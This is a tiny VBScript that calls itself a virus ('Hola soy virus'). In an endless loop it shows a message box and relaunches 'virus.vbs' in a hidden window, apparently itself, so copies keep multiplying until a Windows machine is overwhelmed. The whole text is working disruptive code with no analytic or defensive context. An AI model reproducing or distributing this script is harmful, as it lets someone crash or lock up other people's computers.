do
msgbox "Hola soy virus"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & "virus.vbs" & Chr(34), 0
Set WshShell = Nothing 
loop